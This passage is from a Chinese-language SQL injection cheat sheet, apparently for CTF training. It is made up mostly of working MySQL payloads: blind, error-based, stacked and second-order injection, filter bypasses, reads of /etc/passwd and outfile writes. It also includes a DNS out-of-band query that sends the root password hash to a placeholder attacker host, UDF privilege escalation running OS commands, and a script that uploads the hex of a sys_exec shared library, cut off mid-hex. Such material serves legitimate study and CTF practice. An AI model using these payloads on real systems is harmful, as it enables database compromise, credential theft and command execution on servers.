0x5e5b6d2d7a5d), sleep(5), 1) where id=15;update users set username = &#x27;0&#x27; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14; insert注入123#盲注insert into users values (16,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));insert into users values (15,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d)); order by注入12345#报错注入select * from users order by updatexml(1,concat(0x7e,(select%20user()),0x7e),1);#盲注select * from users order by id ^(select(select version()) regexp &#x27;^5&#x27;); group by注入12#盲注select * from users group by 1 having substr((select database()),1,1)=&#x27;c&#x27; 宽字节注入国内最常使用的 GBK 编码，这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。反斜杠 \\ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \\，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。 GET方式：利用URLencode ?id=1%df&#39;||1=&#123;payload&#125;%23 POST方式：利用UTF-16或UTF-32或中文 ?id=1我&#39;||1=&#123;payload&#125;# ​ 堆叠注入由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。 1234567891011121;show databases;#1;show tables;#1;show columns from [表名];#1;update`ctfshow_user`set`pass`=(0x31323334)where(username=0x61646d696e)/*预处理*/1;PREPARE hacker from char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);EXECUTE hacker;#1;PREPARE hacker from 0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;EXECUTE hacker;#1&#x27;;SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;#1&#x27;;SET @sqli=0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;PREPARE hacker from @sqli;EXECUTE hacker;# 二次注入攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。 现在通常Web应用程序大多都会进行参数过滤，来防止注入。如果某处使用了urldecode()或者 rawurldecode()函数，则会导致二次解码生成单引号二引发注入，即二次注入。 Web应用程序通常使用addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。 addslashes函数虽然在过滤之后会添加 “\\” 进行转义，但是 “\\” 并不会被带到数据库中 二次urldecode注入单引号：%25%27 双引号：%25%22 文件操作读文件： SELECT LOAD_FILE(&#39;/etc/passwd&#39;) SELECT LOAD_FILE(0x2f666c6167) 写文件： SELECT &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/phpinfo.php&#39; select version() into outfile &quot;/var/www/html/test.php&quot; LINES TERMINATED BY 0x16进制文件 ​ Rogue Mysql Server搭建恶意mysql服务器读取文件。 https://github.com/allyshka/Rogue-MySql-Server ​ QuineQuine又叫做自产生程序，在sql注入技术中，这是一种使得输入的sql语句和输出的sql语句一致的技术，常用于一些特殊的登陆绕过sql注入中。 参考：从三道赛题再谈Quine trick 123SELECT REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;);-- CHAR =&gt; 0x ​ 绕过（bypass）空格 多层括号嵌套 改用+号 使用注释代替（/*注释内容*/、/*! MYSQL专属*/） and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略 %09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格 单双引号 需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。 不需要跳出单引号的情况：字符串可用16进制表示、也可通过进制转换函数表示成其他进制。 1234-- hex 编码SELECT * FROM Users WHERE username = 0x61646D696E-- char() 函数SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) 逗号 采用 substr((database())from(&#123;&#125;)for(1)) 的形式 采用join：union select * from ((select 1)a join (select 2)b join (select 3)c); 等号 like 用regexp或者in &lt;&gt; and / or 双写anandd、oorr 使用运算符代替&amp;&amp;、|| 直接拼接=号，如：?id=1=(condition) 其他方法，如：?id=1^(condition)、?id=1)xor(condition) union 盲注：&#39;and(select pass from users limit 1)=&#39;secret select 有文件读取权限 12&#x27; and substr(load_file(&#x27;file&#x27;),locate(&#x27;DocumentRoot&#x27;,(load_file(&#x27;file&#x27;)))+length(&#x27;DocumentRoot&#x27;),10)=&#x27;a&#x27;=&#x27;&#x27; into outfile &#x27;/var/www/dump.txt 获取列名 123&#x27; and 列名 is not null#&#x27; procedure analyse()#&#x27;and substr(pass,1,1)=&#x27;a /*使用substr来做过滤条件*/ handler语句代替select查询 1234567/*通过handler语句查询users表的内容*/handler users open as yunensec; /*指定数据表进行载入并将返回句柄重命名*/handler yunensec read first; /*读取指定表/句柄的首行数据*/handler yunensec read next; /*读取指定表/句柄的下一行数据*/handler yunensec read next; /*读取指定表/句柄的下一行数据*/...handler yunensec close; /*关闭句柄*/ limit123&#x27;and(select pass from users where id=1)=&#x27;a&#x27;and(select pass from users group by id having id=1)=&#x27;a&#x27;and length((select pass from users having substr(pass,1,1)=&#x27;a&#x27;)) where join/left join/right join...on... information_schema 替代表：sys.x$schema_flattened_keys 、sys.schema_table_statistics as database() =&gt; schema() if case when 其他关键字 双写绕过关键字过滤 使用同义函数/语句代替，如if函数可用case when condition then 1 else 0 end语句代替。 使用 CONCAT() 时，任何个参数为 null，将返回 null，推荐使用 CONCAT_WS()。CONCAT_WS()函数第一个参数表示用哪个字符间隔所查询的结果。 1234 SELECT &#x27;a&#x27; &#x27;d&#x27; &#x27;mi&#x27; &#x27;n&#x27;;SELECT CONCAT(&#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;); SELECT CONCAT_WS(&#x27;&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;);SELECT GROUP_CONCAT(&#x27;a&#x27;, &#x27;d&#x27;, &#x27;m&#x27;, &#x27;i&#x27;, &#x27;n&#x27;); 括号 order by 大小比较盲注 数字 用true换1 12def cal(x): return (&#x27;(&#x27;+&#x27;(true)+&#x27;*x)[:-1]+&#x27;)&#x27; 替换表 代替字符 数 代替字符 数 代替字符 数 数 代替字符 false、!pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K true、!(!pi()) 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M floor(pi())、~~pi() 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O floor(version()) //注意版本 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T mysql系统库123456#查询所有非系统自带数据库、表、列select table_schema,table_name,column_name from information_schema.columns where table_schema not in (&#x27;sys&#x27;,&#x27;mysql&#x27;,&#x27;information_schema&#x27;,&#x27;performance_schema&#x27;)#查询指定库的表select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database() sys系统库12345678910111213141516171819#查询所有的库：SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#查询指定库的表（若无则说明此表从未被访问）：SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;#统计所有访问过的表次数:库名,表名,访问次数select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;#查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)SELECT user,db,command,current_statement,last_statement,time FROM sys.session;#查看所有曾连接数据库的IP,总连接次数SELECT host,total_connections FROM sys.host_summary;#查看语句的执行记录SELECT * from sys.x$statement_analysis; 无列名注入（or / column 被过滤）12345select group_concat(`2`) from (select 1,2,3 union select * from user)x;select `2` from (select 1,2,3 union select * from user)x limit 1,1;select ((select 1,&#x27;ae&#x27;,0)&gt;(select * from user));union all select * from (select * from users as a join users b using(id,username))c--+extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))# 参考文https://xz.aliyun.com/t/7169 ​ DNS带外注入（OOB）out-of-band带外数据（OOB）与inband相反，它是一种通过其他传输方式来窃取数据的技术（例如利用DNS解析协议和电子邮件）。OOB技术通常需要易受攻击的实体生成出站TCP/UDP/ICMP请求，然后允许攻击者泄露数据。OOB攻击的成功基于出口防火墙规则，即是否允许来自易受攻击的系统和外围防火墙的出站请求。而从域名服务器（DNS）中提取数据，则被认为是最隐蔽有效的方法。 利用原理： 利用条件： 需要Windows环境 1、DBMS中需要有可用的，能直接或间接引发DNS解析过程的子程序，即使用到UNC 2、Linux没有UNC路径，所以当处于Linux环境，不能使用该方式获取数据 工具： DNSLog.cn CEYE 123456789#secure_file_priv指定文件夹或为空（没有设置）（mysql&gt;5.5.53默认null，禁用导入导出）#查询secure_file_privselect @@secure_file_priv;select @@global.secure_file_priv;show variables like &quot;secure_file_priv&quot;;#注入SELECT LOAD_FILE(CONCAT(&#x27;\\\\\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.attacker.com\\\\foobar&#x27;));select load_file(concat(0x5c5c5c5c,(select database()),0x2E62383862306437653533326238663635333164322E642E7A6861636B2E63615C5C612E747874)); ​ UDFUDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限。 参考： Mysql UDF 提权 MySQL UDF提权十六进制查询 123456789show variables like &#x27;%plugin%&#x27;;# 通常是/usr/lib/mysql/plugin/select unhex(&#x27;udf.so的十六进制&#x27;) into dumpfile&#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;create function sys_eval returns string soname &#x27;mysqludf.so&#x27;;select sys_eval(&#x27;whoami&#x27;); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#参考脚本#环境：Linux/MariaDBimport requestsurl=&#x27;http://15700a19-71aa-4c90-b3ca-b6db9d77c56d.chall.ctf.show/api/?id=&#x27;code=&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F4